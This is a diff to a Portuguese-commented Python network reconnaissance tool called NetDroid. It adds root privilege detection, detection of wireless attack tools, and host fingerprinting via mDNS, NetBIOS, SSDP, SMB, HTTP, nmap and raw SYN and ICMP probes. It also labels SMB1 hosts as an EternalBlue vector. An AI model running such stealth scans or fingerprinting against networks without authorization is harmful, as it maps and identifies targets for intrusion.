+        if IS_WINDOWS:
+            return "windows"
+        if IS_TERMUX:
+            return "termux"
+        return "linux"
+
+    @classmethod
+    def detectar_e_validar(cls, ui: "TerminalUI") -> Optional["ContextoPrivilegio"]:
+        """Detecta SO, confere privilégio. Retorna instância ATIVA se ok,
+        None se falhar (ui já reporta o erro)."""
+        ctx = cls()
+        ctx.plataforma = cls.detectar_plataforma()
+        ok = False
+        if ctx.plataforma == "windows":
+            ctx.motor = "adm"
+            ok = ctx._validar_admin_windows()
+        elif ctx.plataforma == "termux":
+            ctx.motor = "root-termux"
+            ok = ctx._validar_root_termux()
+        else:
+            ctx.motor = "root-kali"
+            ok = ctx._validar_root_linux()
+
+        if not ok:
+            ui.error(f"--root requisitado mas privilégio insuficiente "
+                     f"(plataforma: {ctx.plataforma}, motor esperado: {ctx.motor}).")
+            ctx._dica_como_obter(ui)
+            return None
+
+        ctx.ativo = True
+        ctx._descobrir_capabilities()
+        ctx._imprimir_banner(ui)
+        return ctx
+
+    def _validar_admin_windows(self) -> bool:
+        try:
+            import ctypes
+            return bool(ctypes.windll.shell32.IsUserAnAdmin())
+        except Exception:
+            return False
+
+    def _validar_root_linux(self) -> bool:
+        try:
+            if hasattr(os, "geteuid") and os.geteuid() == 0:
+                # Confirma com teste de raw socket
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+                    s.close()
+                    self.capabilities.add("raw_socket")
+                except Exception:
+                    pass
+                return True
+        except Exception:
+            return False
+        return False
+
+    def _validar_root_termux(self) -> bool:
+        if not HAS_SU:
+            return False
+        try:
+            saida = subprocess.check_output(["su", "-c", "id"],
+                                             timeout=5, stderr=subprocess.DEVNULL)
+            return b"uid=0" in saida
+        except Exception:
+            return False
+
+    def _descobrir_capabilities(self):
+        # Capabilities universais (já detectadas globalmente)
+        if HAS_SCAPY:    self.capabilities.add("scapy")
+        if HAS_NMAP_BIN: self.capabilities.add("nmap")
+        # Por motor
+        if self.motor == "root-kali":
+            if HAS_AIREPLAY:  self.capabilities.add("aireplay")
+            if HAS_AIRMON:    self.capabilities.add("airmon")
+            if HAS_MDK4:      self.capabilities.add("mdk4")
+            if HAS_TCPDUMP:   self.capabilities.add("tcpdump")
+            if HAS_IW:        self.capabilities.add("iw")
+            if HAS_ARPSCAN:   self.capabilities.add("arp-scan")
+            if HAS_IPTABLES:  self.capabilities.add("iptables")
+            self.capabilities.add("raw_socket")
+            try:
+                if os.path.exists("/sys/class/thermal/thermal_zone0/temp"):
+                    self.capabilities.add("thermal_monitor")
+            except Exception:
+                pass
+        elif self.motor == "root-termux":
+            if HAS_AIREPLAY:  self.capabilities.add("aireplay")
+            if HAS_AIRMON:    self.capabilities.add("airmon")
+            if HAS_MDK4:      self.capabilities.add("mdk4")
+            if HAS_TCPDUMP:   self.capabilities.add("tcpdump")
+            if HAS_IW:        self.capabilities.add("iw")
+            if HAS_IPTABLES:  self.capabilities.add("iptables")
+            self.capabilities.add("raw_socket")
+            self.capabilities.add("su")
+            try:
+                if os.path.exists("/sys/class/thermal/thermal_zone0/temp"):
+                    self.capabilities.add("thermal_monitor")
+            except Exception:
+                pass
+        elif self.motor == "adm":
+            if HAS_NETSH:       self.capabilities.add("netsh")
+            if HAS_PKTMON:      self.capabilities.add("pktmon")
+            if HAS_POWERSHELL:  self.capabilities.add("powershell")
+            self.capabilities.add("raw_socket")  # Admin libera raw socket no Windows
+
+    def _dica_como_obter(self, ui: "TerminalUI"):
+        if self.plataforma == "windows":
+            ui.info("Como obter: abra PowerShell/cmd como ADMINISTRADOR e rode novamente.")
+        elif self.plataforma == "termux":
+            ui.info("Como obter: instale Magisk/su no Android, conceda permissão ao Termux,")
+            ui.info("              rode `pkg install tsu` e use `tsu` para virar root.")
+        else:
+            ui.info("Como obter: execute com `sudo python NetDroid.py ...` ou troque para root.")
+
+    def _imprimir_banner(self, ui: "TerminalUI"):
+        ui.section(f"PRIVILEGE MODE ATIVADO — {self.motor.upper()}")
+        ui.success(f"Plataforma: {self.plataforma} | Motor: {self.motor}")
+        if self.capabilities:
+            ui.info(f"Capabilities ({len(self.capabilities)}): "
+                    f"{', '.join(sorted(self.capabilities))}")
+        # Hints sobre capabilities ausentes úteis
+        ausentes = []
+        if self.motor == "root-kali":
+            for cap, hint in [("aireplay", "apt install aircrack-ng"),
+                              ("mdk4", "apt install mdk4"),
+                              ("tcpdump", "apt install tcpdump"),
+                              ("scapy", "pip install scapy")]:
+                if cap not in self.capabilities:
+                    ausentes.append(f"{cap} ({hint})")
+        elif self.motor == "root-termux":
+            for cap, hint in [("aireplay", "pkg install aircrack-ng"),
+                              ("tcpdump", "pkg install tcpdump"),
+                              ("scapy", "pip install scapy")]:
+                if cap not in self.capabilities:
+                    ausentes.append(f"{cap} ({hint})")
+        elif self.motor == "adm":
+            if "scapy" not in self.capabilities:
+                ausentes.append("scapy (pip install scapy) + NPCAP para 802.11")
+        if ausentes:
+            ui.warn(f"Ausentes (instale para máximo poder): {' | '.join(ausentes)}")
+
+    def resumo(self) -> Dict[str, Any]:
+        return {
+            "plataforma": self.plataforma,
+            "motor": self.motor,
+            "ativo": self.ativo,
+            "capabilities": sorted(self.capabilities),
+        }
+
+
+# Variável global única — set no main_async se --root passou
+ctx_priv: Optional[ContextoPrivilegio] = None
+
+
+def priv_ativo() -> bool:
+    return ctx_priv is not None and ctx_priv.ativo
+
+
+def tem_cap(c: str) -> bool:
+    return priv_ativo() and c in ctx_priv.capabilities
+
+
+def temperatura_cpu() -> float:
+    """Lê /sys/class/thermal/thermal_zone0/temp e retorna °C. -1 se indisponível."""
+    try:
+        with open("/sys/class/thermal/thermal_zone0/temp", "r") as f:
+            v = int(f.read().strip())
+            return v / 1000.0 if v > 1000 else float(v)
+    except Exception:
+        return -1.0
+
 
 # ══════════════════ TERMINAL UI ═══════════════════════════════
 
@@ -536,17 +1776,22 @@ class NetworkDetector:
 # ═════════════════ HOST DISCOVERY ═════════════════════════════
 
 class HostDiscovery:
-    """ARP cache, ping sweep, TCP probe, TTL fingerprint, MAC vendor."""
+    """Inteligência de descoberta militar: ARP, ping, TCP probe, TTL,
+    mDNS, NetBIOS, SSDP, SMB, HTTP-title, DHCP leases e nmap opcional.
+    Classifica cada host por tipo e gera score de confiança."""
 
     def __init__(self, ui: TerminalUI, detector: NetworkDetector):
         self.ui = ui
         self.det = detector
         self.hosts: List[Dict[str, Any]] = []
         self._arp_cache: Dict[str, str] = {}
+        self._dhcp_map: Dict[str, str] = {}
 
     async def discover(self) -> List[Dict[str, Any]]:
         self.ui.section("HOST DISCOVERY")
+        emitir("fase", nome="DESCOBERTA — varredura inicial", indice="1/3")
         self._read_arp_cache()
+        self._dhcp_map = self._ler_dhcp_leases()
         candidates = self.det.get_hosts()
         if not candidates:
             self.ui.error("Nenhum host candidato encontrado.")
@@ -558,6 +1803,17 @@ class HostDiscovery:
         for ip in sorted(alive, key=lambda x: ipaddress.ip_address(x)):
             host = self._build_host_info(ip, alive[ip])
             self.hosts.append(host)
+            emitir("host_found", **host)
+
+        # Camada de Inteligência Total (paralela, não-bloqueante por host)
+        if self.hosts:
+            emitir("fase", nome="DESCOBERTA — enriquecimento (mDNS/SMB/HTTP/...)", indice="1/3")
+            await self._enriquecer_hosts()
+            for h in self.hosts:
+                self._classificar_dispositivo(h)
+                self._calcular_confianca(h)
+                emitir("host_update", **h)
+
         self._print_results()
         return self.hosts
 
@@ -671,11 +1927,28 @@ class HostDiscovery:
         vendor = self._lookup_vendor(mac)
         os_guess = self._ttl_fingerprint(ip)
         is_gw = ip == self.det.gateway
-        return {
+        fontes: List[str] = []
+        if mac != "N/A":
+            fontes.append("arp")
+        if os_guess != "Unknown":
+            fontes.append("ttl")
+        host: Dict[str, Any] = {
             "ip": ip, "mac": mac, "vendor": vendor, "os": os_guess,
             "latency_ms": round(latency, 2), "is_gateway": is_gw,
             "ports": [], "services": {},
+            # campos de inteligência expandida
+            "hostname": "",
+            "device_type": "desconhecido",
+            "fontes": fontes,
+            "confiancas": {},
+            "vulns": [],
+            "extra": {},  # dicionário livre para SSDP/HTTP/SMB metadata
         }
+        # DHCP lease já oferece hostname?
+        if ip in self._dhcp_map:
+            host["hostname"] = self._dhcp_map[ip]
+            host["fontes"].append("dhcp")
+        return host
 
     def _lookup_vendor(self, mac: str) -> str:
         if mac == "N/A":
@@ -704,6 +1977,488 @@ class HostDiscovery:
             pass
         return "Unknown"
 
+    # ─── Camada de Inteligência ─────────────────────────────────
+
+    async def _enriquecer_hosts(self):
+        """Roda em paralelo todas as técnicas passivas/leves de identificação."""
+        self.ui.info("Inteligência total: mDNS, NetBIOS, SSDP, SMB, HTTP, nmap...")
+        loop = asyncio.get_event_loop()
+        tarefas = []
+        for h in self.hosts:
+            tarefas.append(self._enriquecer_host_unico(h, loop))
+        if tarefas:
+            await asyncio.gather(*tarefas, return_exceptions=True)
+
+    async def _enriquecer_host_unico(self, host: Dict[str, Any], loop):
+        ip = host["ip"]
+        # Técnicas que rodam em executor (socket bloqueante)
+        try:
+            mdns_nome = await loop.run_in_executor(None, self._consultar_mdns, ip)
+            if mdns_nome:
+                if not host["hostname"]:
+                    host["hostname"] = mdns_nome
+                host["extra"]["mdns"] = mdns_nome
+                host["fontes"].append("mdns")
+        except Exception:
+            pass
+        try:
+            nb_nome = await loop.run_in_executor(None, self._consultar_netbios, ip)
+            if nb_nome:
+                if not host["hostname"]:
+                    host["hostname"] = nb_nome
+                host["extra"]["netbios"] = nb_nome
+                host["fontes"].append("netbios")
+        except Exception:
+            pass
+        try:
+            ssdp_meta = await loop.run_in_executor(None, self._sondar_ssdp, ip)
+            if ssdp_meta:
+                host["extra"]["ssdp"] = ssdp_meta
+                host["fontes"].append("ssdp")
+                if not host["hostname"] and ssdp_meta.get("server"):
+                    host["hostname"] = ssdp_meta["server"][:60]
+        except Exception:
+            pass
+        try:
+            smb_dialeto = await loop.run_in_executor(None, self._banner_smb, ip)
+            if smb_dialeto:
+                host["extra"]["smb"] = smb_dialeto
+                host["fontes"].append("smb")
+                if "Windows" not in host["os"] and "SMB" in smb_dialeto:
+                    host["os"] = "Windows (SMB)"
+        except Exception:
+            pass
+        # HTTP hostname é async puro (aiohttp) ou socket fallback
+        try:
+            http_meta = await self._coletar_http(ip)
+            if http_meta:
+                host["extra"]["http"] = http_meta
+                host["fontes"].append("http")
+                if not host["hostname"] and http_meta.get("title"):
+                    host["hostname"] = http_meta["title"][:60]
+        except Exception:
+            pass
+        # nmap OS detection — opcional, só se o binário estiver disponível
+        if HAS_NMAP_BIN:
+            try:
+                nmap_os = await self._nmap_os(ip)
+                if nmap_os:
+                    host["extra"]["nmap_os"] = nmap_os
+                    host["fontes"].append("nmap")
+                    if host["os"] in ("Unknown", "Linux/Android", "Windows", "iOS/Cisco/Network"):
+                        host["os"] = nmap_os
+            except Exception:
+                pass
+
+        # ─── Boost --root: técnicas privilegiadas adicionais ───
+        if priv_ativo():
+            try:
+                await self._enriquecer_root(host, loop)
+            except Exception:
+                pass
+
+    async def _enriquecer_root(self, host: Dict[str, Any], loop):
+        """Enriquecimento adicional disponível só sob --root.
+        Adiciona em host['fontes']: raw_arp, raw_icmp, syn_fp."""
+        ip = host["ip"]
+        # 1) Raw ICMP echo (mede TTL real e RTT sem subprocess ping)
+        if "raw_socket" in (ctx_priv.capabilities if ctx_priv else set()):
+            try:
+                ttl, rtt = await loop.run_in_executor(None, self._raw_icmp_echo, ip)
+                if ttl > 0:
+                    host["extra"]["raw_icmp"] = {"ttl": ttl, "rtt_ms": rtt}
+                    host["fontes"].append("raw_icmp")
+                    if host.get("os", "Unknown") == "Unknown":
+                        host["os"] = self._inferir_os_por_ttl(ttl)
+            except Exception:
+                pass
+        # 2) Raw ARP active probe (scapy)
+        if tem_cap("scapy") and ctx_priv and ctx_priv.motor in ("root-kali", "root-termux"):
+            try:
+                mac = await loop.run_in_executor(None, self._raw_arp_probe, ip)
+                if mac and host.get("mac", "N/A") in ("N/A", ""):
+                    host["mac"] = mac
+                    host["fontes"].append("raw_arp")
+                    host["vendor"] = self._lookup_vendor(mac)
+            except Exception:
+                pass
+        # 3) SYN fingerprint (TTL + window + flags) para refinar OS
+        if tem_cap("scapy"):
+            try:
+                fp = await loop.run_in_executor(None, self._syn_fingerprint, ip)
+                if fp:
+                    host["extra"]["syn_fp"] = fp
+                    host["fontes"].append("syn_fp")
+                    if fp.get("os_palpite"):
+                        host["os"] = fp["os_palpite"]
+            except Exception:
+                pass
+
+    def _raw_icmp_echo(self, ip: str) -> Tuple[int, float]:
+        """Envia 1 pacote ICMP echo via raw socket. Retorna (ttl, rtt_ms).
+        Requer privilégio root/admin (já validado em ctx_priv)."""
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+            s.settimeout(1.0)
+            ident = os.getpid() & 0xFFFF
+            seq = 1
+            # Header ICMP: type(8)=echo, code=0, checksum=0, ident, seq + payload
+            payload = b"NetDroid-RAW-Probe"
+            cab = struct.pack("!BBHHH", 8, 0, 0, ident, seq) + payload
+            # Cálculo de checksum
+            def chk(data):
+                if len(data) % 2: data += b"\x00"
+                s_ = 0
+                for i in range(0, len(data), 2):
+                    s_ += (data[i] << 8) | data[i+1]
+                s_ = (s_ >> 16) + (s_ & 0xFFFF)
+                s_ += s_ >> 16
+                return ~s_ & 0xFFFF
+            cs = chk(cab)
+            cab = struct.pack("!BBHHH", 8, 0, cs, ident, seq) + payload
+            t0 = time.time()
+            s.sendto(cab, (ip, 0))
+            data, _ = s.recvfrom(1024)
+            rtt = (time.time() - t0) * 1000.0
+            s.close()
+            ttl = data[8] if len(data) > 8 else 0
+            return ttl, round(rtt, 2)
+        except Exception:
+            return 0, 0.0
+
+    def _inferir_os_por_ttl(self, ttl: int) -> str:
+        if ttl <= 0:    return "Unknown"
+        if ttl <= 64:   return "Linux/Android (TTL 64)"
+        if ttl <= 128:  return "Windows (TTL 128)"
+        return "iOS/Cisco/Network (TTL 255)"
+
+    def _raw_arp_probe(self, ip: str) -> str:
+        """Probe ARP via scapy. Retorna MAC ou ''."""
+        if not HAS_SCAPY:
+            return ""
+        try:
+            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
+                         timeout=1, verbose=False, retry=1)
+            for _, r in ans:
+                return r[Ether].src.upper()
+        except Exception:
+            return ""
+        return ""
+
+    def _syn_fingerprint(self, ip: str) -> Dict[str, Any]:
+        """SYN para 80/443/22, lê TTL/window/MSS para palpite de OS."""
+        if not HAS_SCAPY:
+            return {}
+        for porta in (80, 443, 22, 8080):
+            try:
+                pkt = IP(dst=ip)/TCP(dport=porta, flags="S", seq=random.randint(0, 0xFFFFFFFF))
+                resp = sr1(pkt, timeout=1, verbose=False)
+                if not resp or not resp.haslayer(TCP):
+                    continue
+                ttl = resp[IP].ttl
+                window = resp[TCP].window
+                # Palpite simples por TTL+window
+                palpite = self._inferir_os_por_ttl(ttl)
+                if window in (5840, 14600, 29200, 65535) and ttl <= 64:
+                    palpite = "Linux"
+                elif window in (8192, 65535) and ttl <= 128:
+                    palpite = "Windows"
+                elif ttl > 128:
+                    palpite = "Network device (Cisco/router)"
+                return {"porta": porta, "ttl": ttl, "window": window,
+                        "os_palpite": palpite}
+            except Exception:
+                continue
+        return {}
+
+    def _consultar_mdns(self, ip: str) -> str:
+        """Envia query mDNS unicast para porta 5353 e tenta extrair nome .local."""
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.settimeout(1.0)
+            # Query DNS-SD: PTR _services._dns-sd._udp.local
+            tx_id = b"\x00\x00"
+            flags = b"\x00\x00"
+            qd = b"\x00\x01"
+            an = ar = ns = b"\x00\x00"
+            nome = b"\x09_services\x07_dns-sd\x04_udp\x05local\x00"
+            qtype = b"\x00\x0c"  # PTR
+            qclass = b"\x00\x01"
+            pacote = tx_id + flags + qd + an + ns + ar + nome + qtype + qclass
+            s.sendto(pacote, (ip, 5353))
+            data, _ = s.recvfrom(2048)
+            s.close()
+            # Heurística: tenta extrair labels ASCII de tamanho prefixado
+            extraido = []
+            i = 0
+            while i < len(data):
+                tam = data[i]
+                if tam == 0 or tam > 63:
+                    i += 1
+                    continue
+                trecho = data[i+1:i+1+tam]
+                if all(32 <= b < 127 for b in trecho):
+                    extraido.append(trecho.decode("ascii", errors="ignore"))
+                i += 1 + tam
+            for tok in extraido:
+                if tok.endswith("local") or "." in tok and len(tok) > 3:
+                    return tok
+            for tok in extraido:
+                if 3 < len(tok) < 40 and tok.lower() not in ("services", "dns-sd", "udp", "tcp"):
+                    return tok
+        except Exception:
+            return ""
+        return ""
+
+    def _consultar_netbios(self, ip: str) -> str:
+        """NBSTAT NodeStatus na UDP/137. Decodifica nome NetBIOS de Windows."""
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.settimeout(1.0)
+            # Pacote NBSTAT mínimo (NodeStatus: nome '*' codificado)
+            pacote = (
+                b"\x82\x28"             # tx id
+                b"\x00\x00"             # flags
+                b"\x00\x01\x00\x00\x00\x00\x00\x00"
+                b"\x20"                 # length 32
+                b"CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"  # '*' codificado
+                b"\x00"
+                b"\x00\x21"             # type NBSTAT
+                b"\x00\x01"             # class IN
+            )
+            s.sendto(pacote, (ip, 137))
+            data, _ = s.recvfrom(2048)
+            s.close()
+            if len(data) < 57:
+                return ""
+            qtd = data[56]
+            inicio = 57
+            for n in range(qtd):
+                if inicio + 18 > len(data):
+                    break
+                nome_bruto = data[inicio:inicio+15].decode("ascii", errors="ignore").strip()
+                tipo = data[inicio+15]
+                flags = data[inicio+16:inicio+18]
+                inicio += 18
+                # Tipo 0x00 + flag de grupo desligado = nome de máquina
+                if tipo == 0x00 and not (flags[0] & 0x80):
+                    if nome_bruto and nome_bruto.replace("\x00", "").strip():
+                        return nome_bruto.strip()
+        except Exception:
+            return ""
+        return ""
+
+    def _sondar_ssdp(self, ip: str) -> Dict[str, str]:
+        """M-SEARCH unicast. Lê headers SERVER/LOCATION/USN."""
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.settimeout(1.5)
+            msg = (
+                "M-SEARCH * HTTP/1.1\r\n"
+                f"HOST: {ip}:1900\r\n"
+                "MAN: \"ssdp:discover\"\r\n"
+                "MX: 1\r\n"
+                "ST: ssdp:all\r\n\r\n"
+            ).encode("utf-8")
+            s.sendto(msg, (ip, 1900))
+            data, _ = s.recvfrom(2048)
+            s.close()
+            texto = data.decode("utf-8", errors="ignore")
+            meta: Dict[str, str] = {}
+            for linha in texto.splitlines():
+                if ":" in linha:
+                    k, v = linha.split(":", 1)
+                    k = k.strip().lower()
+                    v = v.strip()
+                    if k in ("server", "location", "usn", "st"):
+                        meta[k] = v
+            return meta
+        except Exception:
+            return {}
+
+    def _banner_smb(self, ip: str) -> str:
+        """Negotiate Protocol mínimo na 445; identifica dialeto SMB."""
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(1.5)
+            s.connect((ip, 445))
+            # Pacote SMB1 NegotiateProtocol com dialetos comuns
+            pacote = (
+                b"\x00\x00\x00\x85"
+                b"\xffSMB"
+                b"\x72"                          # NegotiateProtocol
+                b"\x00\x00\x00\x00"
+                b"\x18\x53\xc8"
+                b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+                b"\x00\x00"
+                b"\xff\xff"
+                b"\x00\x00"
+                b"\x00\x00"
+                b"\x00\x62"
+                b"\x00\x02PC NETWORK PROGRAM 1.0\x00"
+                b"\x02LANMAN1.0\x00"
+                b"\x02Windows for Workgroups 3.1a\x00"
+                b"\x02LM1.2X002\x00"
+                b"\x02LANMAN2.1\x00"
+                b"\x02NT LM 0.12\x00"
+                b"\x02SMB 2.002\x00"
+                b"\x02SMB 2.???\x00"
+            )
+            s.sendall(pacote)
+            resp = s.recv(1024)
+            s.close()
+            if b"SMB 2.???" in resp or resp[4:8] == b"\xfeSMB":
+                return "SMB 2.x/3.x"
+            if b"NT LM 0.12" in resp:
+                return "SMB 1.0 (NT LM 0.12) — vetor EternalBlue"
+            return "SMB (dialeto desconhecido)"
+        except Exception:
+            return ""
+
+    async def _coletar_http(self, ip: str) -> Dict[str, str]:
+        """Tenta GET em 80/443/8080 e extrai title/server."""
+        if not HAS_AIOHTTP:
+            return {}
+        portas = [(80, "http"), (8080, "http"), (443, "https"), (8443, "https")]
+        for porta, esquema in portas:
+            url = f"{esquema}://{ip}:{porta}/"
+            try:
+                timeout = aiohttp.ClientTimeout(total=2)
+                conn = aiohttp.TCPConnector(ssl=False, force_close=True)
+                async with aiohttp.ClientSession(timeout=timeout, connector=conn) as ses:
+                    async with ses.get(url, ssl=False) as resp:
+                        body = await resp.read()
+                        texto = body[:4096].decode("utf-8", errors="ignore")
+                        m = re.search(r"<title[^>]*>([^<]{1,120})</title>", texto, re.I)
+                        title = m.group(1).strip() if m else ""
+                        return {
+                            "url": url,
+                            "status": str(resp.status),
+                            "server": resp.headers.get("Server", ""),
+                            "title": title,
+                            "porta": str(porta),
+                        }
+            except Exception:
+                continue
+        return {}
+
+    async def _nmap_os(self, ip: str) -> str:
+        """Roda `nmap -O` async se o binário estiver disponível."""
+        try:
+            cmd = ["nmap", "-O", "-Pn", "--max-retries", "1", "--host-timeout", "8s", ip]
+            proc = await asyncio.create_subprocess_exec(
+                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.DEVNULL)
+            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=12)
+            saida = stdout.decode(errors="ignore")
+            m = re.search(r"OS details: (.+)", saida)
+            if m:
+                return m.group(1).strip()[:80]
+            m = re.search(r"Running: (.+)", saida)
+            if m:
+                return m.group(1).strip()[:80]
+        except Exception:
+            return ""
+        return ""
+
+    def _ler_dhcp_leases(self) -> Dict[str, str]:
+        """Procura arquivos de lease DHCP comuns e extrai mapa IP→hostname."""
+        candidatos = [
+            "/data/data/com.termux/files/usr/var/lib/dhcp/dhcpd.leases",
+            "/var/lib/dhcp/dhcpd.leases",
+            "/var/lib/dhcpd/dhcpd.leases",
+            "/tmp/dhcp.leases",
+            "/tmp/dnsmasq.leases",
+            "/var/lib/misc/dnsmasq.leases",
+        ]
+        mapa: Dict[str, str] = {}
+        for caminho in candidatos:
+            try:
+                if not os.path.exists(caminho):
+                    continue
+                with open(caminho, "r", errors="ignore") as f:
+                    conteudo = f.read()
+                # ISC DHCP: lease 192.168.0.10 { ... client-hostname "name"; }
+                for ip, nome in re.findall(
+                    r'lease\s+(\d+\.\d+\.\d+\.\d+)\s*\{[^}]*?client-hostname\s+"([^"]+)"',
+                    conteudo, re.S):
+                    mapa[ip] = nome
+                # dnsmasq: timestamp mac ip hostname client-id
+                for linha in conteudo.splitlines():
+                    partes = linha.split()
+                    if len(partes) >= 4 and re.match(r"\d+\.\d+\.\d+\.\d+", partes[2]):
+                        if partes[3] not in ("*", ""):
+                            mapa[partes[2]] = partes[3]
+            except Exception:
+                continue
+        if mapa:
+            self.ui.success(f"DHCP leases: {len(mapa)} hostnames carregados")
+        return mapa
+
+    def _classificar_dispositivo(self, host: Dict[str, Any]):
+        """Aplica DEVICE_HEURISTICS na ordem; primeiro match vence."""
+        portas = set(host.get("ports", []))
+        vendor = host.get("vendor", "")
+        os_str = host.get("os", "")
+        for regra in DEVICE_HEURISTICS:
+            if regra.get("is_gateway") and host.get("is_gateway"):
+                host["device_type"] = regra["tipo"]
+                return
+            if "vendor_in" in regra and vendor in regra["vendor_in"]:
+                host["device_type"] = regra["tipo"]
+                return
+            if "porta_qualquer" in regra and portas.intersection(regra["porta_qualquer"]):
+                host["device_type"] = regra["tipo"]
+                return
+            if "ttl_em" in regra:
+                if any(k.lower() in os_str.lower() for k in regra["ttl_em"]):
+                    host["device_type"] = regra["tipo"]
+                    return
+        # Fallback usando fingerprints HTTP
+        http = host.get("extra", {}).get("http", {})
+        servidor = (http.get("server", "") + " " + http.get("title", "")).lower()
+        if servidor:
+            for fp in DEVICE_FINGERPRINTS:
+                if fp["marker"] in servidor:
+                    host["device_type"] = fp["tipo"]
+                    if host.get("vendor", "Unknown") in ("", "Unknown", "N/A"):
+                        host["vendor"] = fp["vendor"]
+                    return
+        host["device_type"] = "desconhecido"
+
+    def _calcular_confianca(self, host: Dict[str, Any]):
+        """Score 0–100 por campo, baseado em quantidade/qualidade de fontes."""
+        fontes = set(host.get("fontes", []))
+        confiancas: Dict[str, int] = {}
+        # hostname
+        score_h = 0
+        if "dhcp" in fontes: score_h += 50
+        if "netbios" in fontes: score_h += 35
+        if "mdns" in fontes: score_h += 30
+        if "ssdp" in fontes: score_h += 15
+        if "http" in fontes: score_h += 10
+        confiancas["hostname"] = min(100, score_h) if host.get("hostname") else 0
+        # vendor
+        score_v = 0
+        if "arp" in fontes and host.get("vendor", "Unknown") != "Unknown": score_v += 60
+        if "ssdp" in fontes: score_v += 15
+        if "http" in fontes: score_v += 15
+        if "nmap" in fontes: score_v += 10
+        confiancas["vendor"] = min(100, score_v)
+        # os
+        score_o = 0
+        if "nmap" in fontes: score_o += 60
+        if "smb" in fontes: score_o += 25
+        if "ttl" in fontes: score_o += 25
+        confiancas["os"] = min(100, score_o)
+        # device_type
+        score_d = 0
+        if host.get("device_type", "desconhecido") != "desconhecido":
+            score_d = 50
+            if "ssdp" in fontes or "http" in fontes: score_d += 20
+            if host.get("vendor", "Unknown") != "Unknown": score_d += 20
+        confiancas["device_type"] = min(100, score_d)
+        host["confiancas"] = confiancas
+
     def _print_results(self):
         if not self.hosts:
             self.ui.warn("Nenhum host ativo encontrado.")
@@ -711,16 +2466,23 @@ class HostDiscovery:
         rows = []
         for h in self.hosts:
             gw = " [GW]" if h["is_gateway"] else ""
+            tipo = h.get("device_type", "desconhecido")
+            hostname = h.get("hostname", "") or "—"
+            confianca_total = sum(h.get("confiancas", {}).values()) // max(1, len(h.get("confiancas", {})))
             rows.append([
                 h["ip"] + gw,
+                hostname[:24],
                 h["mac"],
                 h["vendor"],
                 h["os"],
+                tipo,
+                f"{confianca_total}%",
                 f"{h['latency_ms']}ms",
             ])
-        self.ui.table("Hosts Descobertos",
-                       [("IP", C_GREEN), ("MAC", C_CYAN), ("Vendor", C_WHITE),
-                        ("OS", C_YELLOW), ("Latency", C_DIM)], rows)
+        self.ui.table("Hosts Descobertos (Inteligência Total)",
+                       [("IP", C_GREEN), ("Hostname", C_PURPLE), ("MAC", C_CYAN),
+                        ("Vendor", C_WHITE), ("OS", C_YELLOW), ("Tipo", C_CYAN),
+                        ("Conf.", C_GREEN), ("Latency", C_DIM)], rows)
 
 
 # ═══════════════════ PORT SCANNER ═════════════════════════════
@@ -759,6 +2521,13 @@ class PortScanner:
         if open_ports:
             services = await self._grab_banners(ip, open_ports)
             host["services"] = services
+            # Avaliação passiva de vulnerabilidades — só roda em modo Insane
+            if self.insane or self.mode == "insane":
+                host["vulns"] = await self._avaliar_vulns(host)
+                # Emite vulns para o dashboard --live
+                for v in host.get("vulns", []):
+                    emitir("vuln_found", ip=ip, **v)
+            emitir("host_update", **host)
         return host
 
     async def scan_all(self, hosts: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
@@ -766,6 +2535,7 @@ class PortScanner:
         if self.insane:
             mode_label += " + INSANE"
         self.ui.section(f"PORT SCAN — {mode_label}")
+        emitir("fase", nome=f"SCAN — {mode_label}", indice="2/3")
         self.ui.info(f"Portas: {len(self.ports)} | Timeout: {self.timeout}s | Alvos: {len(hosts)}")
 
         for host in hosts:
@@ -783,8 +2553,25 @@ class PortScanner:
         return hosts
 
     async def _tcp_scan(self, ip: str) -> List[int]:
+        # Sob --root + scapy, usa SYN raw scan (stealth real, sem 3-way handshake)
+        if priv_ativo() and tem_cap("scapy") and self.mode != "stealth":
+            self.ui.info(f"  [ROOT] Usando SYN raw scan (scapy) em {ip}")
+            try:
+                portas = await self._tcp_scan_raw_syn(ip)
+                if portas is not None:
+                    return portas
+            except Exception as e:
+                self.ui.warn(f"  SYN raw falhou ({e}); caindo para connect scan.")
+
         open_ports: List[int] = []
-        sem = asyncio.Semaphore(CONCURRENT_LIMIT if not self.mode == "stealth" else 50)
+        # Concorrência elevada se --root (kernel libera mais sockets)
+        if priv_ativo() and self.mode != "stealth":
+            limite = CONCURRENT_LIMIT_ROOT
+        elif self.mode == "stealth":
+            limite = 50
+        else:
+            limite = CONCURRENT_LIMIT
+        sem = asyncio.Semaphore(limite)
 
         async def check(port: int):
             async with sem:
@@ -803,15 +2590,80 @@ class PortScanner:
         if progress and len(self.ports) > 100:
             with progress:
                 task = progress.add_task(f"{ip}", total=len(self.ports))
-                batch = 500 if self.mode != "stealth" else 25
+                # Batch maior se --root para saturar a concorrência elevada
+                if self.mode == "stealth":
+                    batch = 25
+                elif priv_ativo():
+                    batch = 1024
+                else:
+                    batch = 500
                 for i in range(0, len(self.ports), batch):
                     chunk = self.ports[i:i + batch]
                     await asyncio.gather(*[check(p) for p in chunk])
                     progress.update(task, advance=len(chunk))
+                    # Thermal guard em Termux
+                    if priv_ativo() and ctx_priv and ctx_priv.motor == "root-termux":
+                        t = temperatura_cpu()
+                        if t >= THERMAL_LIMITE_ABORTAR:
+                            self.ui.error(f"  Temp {t:.1f}°C — abortando scan.")
+                            break
+                        elif t >= THERMAL_LIMITE_REDUZIR and limite > 256:
+                            self.ui.warn(f"  Temp {t:.1f}°C — reduzindo concorrência.")
+                            sem = asyncio.Semaphore(256)
+                            limite = 256
         else:
             await asyncio.gather(*[check(p) for p in self.ports])
 
         return sorted(open_ports)
+
